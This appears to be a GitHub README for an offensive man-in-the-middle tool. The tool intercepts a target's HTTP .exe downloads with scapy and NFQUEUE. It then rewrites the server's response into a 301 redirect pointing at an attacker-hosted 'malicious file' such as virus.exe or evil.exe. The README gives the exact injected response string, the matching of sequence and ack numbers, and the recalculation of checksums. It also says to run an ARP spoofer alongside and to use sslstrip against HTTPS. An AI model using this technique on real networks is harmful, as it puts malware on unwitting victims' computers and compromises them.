# replace-downloads
Built similar to dns-spoofer (www.github.com/maurya-bitlegacy/dns-spoofer). For downloading files, the request and response pass through the http layer, not the dns layer. The http layer check of scapy is convenient enough for printing and analyzing, but inconvenient for modifications (makes code very complex). Utilizing the fact that useful http data is contained in the RAW layer, we can categorize http requests and responses. http requests have http in dport field in the TCP layer and http responses have http in sport field in the TCP layer.

Once we see that the request has some .exe download request, we can modify the response to serve the target computer a file of our taste. We use sequence numbers and ack numbers in the TCP layer to find the response which corresponds to a download request.

For the response of the http request identified through seq and ack, we use the HTTP response code 301: Moved Permanently in the load field (RAW layer) of the response packet which originally would've had HTTP 200: OK, and give the link to our malicious file in the format: "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.com/virus.exe\n\n". Again, we need to remove the len, checksum field in IP and checksum field in TCP layer, which will be calculated and filled again by scapy appropriately. To use a file present in web root (/var/www/html), use ip/dir/filename.exe, eg: 192.168.18.38/evil-files/evil.exe

Run arp-spoof.py (More details: www.github.com/maurya-bitlegacy/arp-spoofer) in parallel, and use FORWARD in NFQUEUE to do this for a target computer.

Sometimes, the error IndexError: Layer [TCP] not found might be thrown by replace-downloads.py because some packets don't have a TCP layer. This can be ignored.

A note on https: To bypass https, sslstrip needs to be set up which runs only on python2. Also, most websites use HSTS harcoding these days, so sslstrip is not likely to capture traffic on those websites. 
